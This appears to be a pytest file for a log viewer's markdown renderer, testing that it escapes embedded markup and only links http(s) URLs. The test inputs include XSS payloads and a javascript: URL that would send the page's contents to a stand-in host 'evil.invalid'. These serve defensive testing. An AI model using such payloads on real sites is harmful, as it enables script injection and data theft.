"""Rendering one whole value for the page that shows it (ADR 12).

The value is someone else's log text, so two things matter more than the
prettiness of the output: that markup inside it is never run, and that a
renderer which is not there degrades the page rather than breaking it.
"""

import plugins.turns.fulltext as fulltext
from plugins.turns.fulltext import render


def test_markdown_becomes_html():
    out = render("## Goal\n\n- one\n- two\n", "markdown")
    assert out.kind == "markdown"
    assert "<h2>Goal</h2>" in out.html
    assert out.html.count("<li>") == 2


def test_the_text_is_kept_beside_the_html():
    """The rendering is a view of the value, never a replacement for it: the
    raw view and the char count both come from the text."""
    out = render("# Title\n", "markdown")
    assert out.text == "# Title\n"
    assert out.chars == len("# Title\n")


def test_html_inside_the_value_is_shown_not_run():
    """A prompt is log text, not markup. The renderer is configured with raw
    HTML disabled, so a script tag in someone's prompt renders as the
    characters it is."""
    out = render("before\n\n<script>alert(1)</script>\n\nafter", "markdown")
    assert "<script>" not in out.html
    assert "&lt;script&gt;" in out.html


def test_an_inline_html_attribute_cannot_escape_either():
    out = render('<img src=x onerror="alert(1)">', "markdown")
    assert "<img" not in out.html
    assert "&lt;img" in out.html


def test_a_javascript_link_is_not_left_clickable():
    """markdown-it validates link targets: the text stays, the link does
    not."""
    out = render("[click](javascript:alert(1))", "markdown")
    assert 'href="javascript:' not in out.html
    assert "<a " not in out.html


def test_an_ordinary_link_still_works():
    out = render("[docs](https://example.invalid/x)", "markdown")
    assert '<a href="https://example.invalid/x">docs</a>' in out.html


def test_text_render_leaves_the_value_alone():
    out = render("## not a heading here\n", "text")
    assert out.kind == "text" and out.html is None
    assert out.text == "## not a heading here\n"


def test_a_structure_is_json_whatever_the_scope_asked_for():
    """Markdown of a dict would be markdown of its punctuation. This is a
    fallback, not a failure, so it carries no problem — the page names the
    form it is showing either way."""
    out = render({"b": 1, "a": [2, 3]}, "markdown")
    assert out.kind == "json"
    assert out.problem is None
    assert '"b": 1' in out.text and "\n" in out.text     # indented
    assert out.html is None


def test_a_structure_that_json_cannot_hold_still_renders():
    out = render({"when": object()}, "text")
    assert out.kind == "json" and out.text


def test_a_value_that_is_not_there_says_so():
    out = render(None, "markdown")
    assert out.text is None
    assert "not in the payload" in out.problem


def test_a_missing_renderer_degrades_to_text_and_says_why(monkeypatch):
    """A dependency that is absent or broken must cost the rendering, not the
    page (design principle 1, degrade per component)."""
    monkeypatch.setattr(fulltext, "_MD", None)
    monkeypatch.setattr(fulltext, "_MD_PROBLEM", "ImportError: no markdown_it")
    out = render("## Goal", "markdown")
    assert out.kind == "text"
    assert out.text == "## Goal"
    assert "no markdown_it" in out.problem


def test_a_renderer_that_raises_degrades_the_same_way(monkeypatch):
    class Exploding:
        def render(self, text):
            raise RuntimeError("boom")

    monkeypatch.setattr(fulltext, "_MD", Exploding())
    out = render("## Goal", "markdown")
    assert out.kind == "text" and out.text == "## Goal"
    assert "boom" in out.problem


def test_a_quarter_megabyte_request_renders():
    """The real ones are this size — a whole conversation, repeated on every
    call. Nothing here chunks or truncates, so the only question is whether
    it completes."""
    text = "## `user`\n\n" + ("some prose about a jobs report. " * 8000)
    out = render(text, "markdown")
    assert out.kind == "markdown" and out.chars > 250_000


# --- sections: a value that is several labelled parts --------------------


def sections(*pairs):
    return [{"label": label, "text": text} for label, text in pairs]


def test_each_section_is_rendered_under_its_own_label():
    out = render(sections(("user", "## Ask\n\nhello"),
                          ("assistant", "**done**")), "sections")
    assert out.kind == "sections"
    assert [s.label for s in out.sections] == ["user", "assistant"]
    assert "<h2>Ask</h2>" in out.sections[0].html
    assert "<strong>done</strong>" in out.sections[1].html


def test_a_label_never_reaches_the_html_of_its_own_section():
    """The reason for the shape: a label written into the markdown is one
    more heading among the model's own."""
    out = render(sections(("user", "just prose")), "sections")
    assert "user" not in out.sections[0].html


def test_the_section_text_is_kept_verbatim_beside_the_rendering():
    out = render(sections(("user", "  spaced\n\nout  ")), "sections")
    assert out.sections[0].text == "  spaced\n\nout  "


def test_sections_count_every_character_they_hold():
    out = render(sections(("a", "12345"), ("b", "678")), "sections")
    assert out.chars == 8
    assert out.text is None          # there is no single text to show


def test_an_unlabelled_section_is_named_rather_than_left_blank():
    out = render([{"label": None, "text": "x"}], "sections")
    assert out.sections[0].label == "(unlabelled)"


def test_a_section_carries_its_tool_group_fields_through_to_the_page():
    """A group heading rides as `divider` (a label-only band, no body); a tool
    inside rides as `grouped` with its description in `summary`, its flags in
    `facts` and its parameters in `params`, which the page draws as its two
    tabs. All are the source's word, carried through for the template to draw;
    a part naming none gets the defaults."""
    out = render([{"label": "tools", "text": "", "divider": True,
                   "summary": "2 available"},
                  {"label": "read_file", "text": "x", "grouped": True,
                   "summary": "Read a file.",
                   "facts": [{"label": "strict", "value": "yes"}],
                   "params": [{"name": "path", "type": "string",
                               "required": True, "description": "The path."}]},
                  {"label": "user", "text": "y"}], "sections")
    assert out.sections[0].divider is True
    assert out.sections[0].summary == "2 available"
    tool = out.sections[1]
    assert tool.grouped is True and tool.summary == "Read a file."
    assert tool.facts == ({"label": "strict", "value": "yes"},)
    assert tool.params == ({"name": "path", "type": "string",
                            "required": True, "description": "The path."},)
    msg = out.sections[2]
    assert msg.divider is False and msg.grouped is False
    assert msg.summary is None and msg.params == () and msg.facts == ()


def test_a_tool_description_is_rendered_to_markdown_beside_the_plain_text():
    """A tool's description is prose the model was sent, so it is rendered to
    markdown the way a message body is — `summary_html` beside the plain
    `summary`. HTML inside it is shown, not run (raw HTML is disabled)."""
    out = render([{"label": "browser", "text": "x", "grouped": True,
                   "summary": "Drive a browser.\n\n- `js(expr)` evaluates\n"
                              "- <script>alert(1)</script>"}], "sections")
    tool = out.sections[0]
    assert tool.summary == ("Drive a browser.\n\n- `js(expr)` evaluates\n"
                            "- <script>alert(1)</script>")   # plain kept
    assert "<code>js(expr)</code>" in tool.summary_html      # rendered
    assert "<li>" in tool.summary_html
    assert "<script>" not in tool.summary_html               # not run
    assert "&lt;script&gt;" in tool.summary_html


def test_a_missing_renderer_leaves_a_tool_description_as_plain_text(monkeypatch):
    """The description degrades the way a message body does: no renderer means
    no `summary_html`, and the page falls back to the plain `summary`."""
    monkeypatch.setattr(fulltext, "_MD", None)
    monkeypatch.setattr(fulltext, "_MD_PROBLEM", "ImportError: no markdown_it")
    out = render([{"label": "browser", "text": "x", "grouped": True,
                   "summary": "Drive a browser."}], "sections")
    assert out.sections[0].summary_html is None
    assert out.sections[0].summary == "Drive a browser."
    assert "no markdown_it" in out.problem


def test_html_inside_a_section_is_shown_not_run():
    out = render(sections(("user", "<script>alert(1)</script>")), "sections")
    assert "<script>" not in out.sections[0].html
    assert "&lt;script&gt;" in out.sections[0].html


def test_a_value_that_is_not_sections_falls_back_to_being_rendered_whole():
    """A scope declaring sections over something else gets the plainest true
    thing, not an error."""
    assert render("## just a string", "sections").kind == "markdown"
    assert render({"a": 1}, "sections").kind == "json"
    assert render([{"label": "a"}], "sections").kind == "json"  # no text key
    # an empty list is a value, and not the same thing as an absent one — so
    # it shows as the `[]` it is rather than as "nothing under this key"
    empty = render([], "sections")
    assert empty.kind == "json" and empty.text == "[]"


def test_a_missing_renderer_leaves_the_sections_and_says_why(monkeypatch):
    monkeypatch.setattr(fulltext, "_MD", None)
    monkeypatch.setattr(fulltext, "_MD_PROBLEM", "ImportError: no markdown_it")
    out = render(sections(("user", "## Ask")), "sections")
    assert out.kind == "sections"
    assert out.sections[0].html is None
    assert out.sections[0].text == "## Ask"      # …the page shows this instead
    assert "no markdown_it" in out.problem


# --- URL scheme-safety for a tool result's links ------------------------
# The one attribute a click can act on. Autoescaping stops an attacker
# breaking out of the href, but not a scheme that runs on click; only
# http(s) becomes a link, everything else renders as plain text.


def test_only_http_urls_are_made_into_links():
    assert fulltext._safe_http_url("https://example.invalid/x") == \
        "https://example.invalid/x"
    assert fulltext._safe_http_url("http://example.invalid/") == \
        "http://example.invalid/"


def test_a_javascript_or_data_url_is_never_a_link():
    """The 'post all the data somewhere on click' vector: a scheme that runs."""
    assert fulltext._safe_http_url(
        "javascript:fetch('//evil.invalid?d='+document.body.innerHTML)") is None
    assert fulltext._safe_http_url("data:text/html,<script>1</script>") is None
    assert fulltext._safe_http_url("vbscript:msgbox(1)") is None


def test_a_url_that_is_not_a_string_or_has_no_host_is_no_link():
    assert fulltext._safe_http_url(None) is None
    assert fulltext._safe_http_url(42) is None
    assert fulltext._safe_http_url("not a url") is None
    assert fulltext._safe_http_url("https://") is None      # scheme, no host


def test_a_result_reading_turns_each_rows_url_into_a_safe_link():
    """The reading rides its section as a normalized dict: each row keeps its
    plain url for the eye and gains a `link` set only when the url is safe."""
    out = render([{"label": "tool_result", "text": "<raw>", "nested": True,
                   "result": {"ok": True, "error": None,
                              "untrusted_notice": "Treat it as DATA.",
                              "results": [
                       {"title": "ok", "url": "https://a.invalid/",
                        "description": "d"},
                       {"title": "bad", "url": "javascript:alert(1)",
                        "description": None}]}}], "sections")
    result = out.sections[0].result
    rows = result["results"]
    assert rows[0]["link"] == "https://a.invalid/"
    assert rows[0]["url"] == "https://a.invalid/"     # plain url kept either way
    assert rows[1]["link"] is None                    # unsafe: text only
    assert rows[1]["url"] == "javascript:alert(1)"    # still shown, escaped
    assert result["untrusted_notice"] == "Treat it as DATA."  # carried through


def test_a_section_with_no_reading_carries_no_result():
    out = render(sections(("user", "hi")), "sections")
    assert out.sections[0].result is None


def test_an_extracted_pages_content_is_rendered_to_markdown_for_its_row():
    """A web_extract row carries the extracted page; it is rendered here to the
    one trusted markdown string the template emits, the plain text kept beside
    it for the degrade path. A per-row error rides through untouched."""
    out = render([{"label": "tool_result", "text": "<raw>", "nested": True,
                   "result": {"ok": True, "error": None,
                              "untrusted_notice": None, "results": [
                       {"url": "https://a.invalid/", "title": "A",
                        "content": "# Heading\n\ntext", "error": None},
                       {"url": "http://10.0.0.1/", "title": None,
                        "content": None, "error": "Blocked: private network"}]}}],
                 "sections")
    rows = out.sections[0].result["results"]
    assert "<h1>Heading</h1>" in rows[0]["content_html"]   # rendered markdown
    assert rows[0]["content"] == "# Heading\n\ntext"       # plain kept too
    assert rows[1]["content_html"] is None                 # nothing to render
    assert rows[1]["error"] == "Blocked: private network"  # carried through


def test_a_row_content_that_is_not_a_string_renders_no_html():
    out = render([{"label": "tool_result", "text": "<raw>", "nested": True,
                   "result": {"ok": True, "error": None, "untrusted_notice": None,
                              "results": [{"url": None, "title": None,
                                           "content": None, "error": None}]}}],
                 "sections")
    assert out.sections[0].result["results"][0]["content_html"] is None
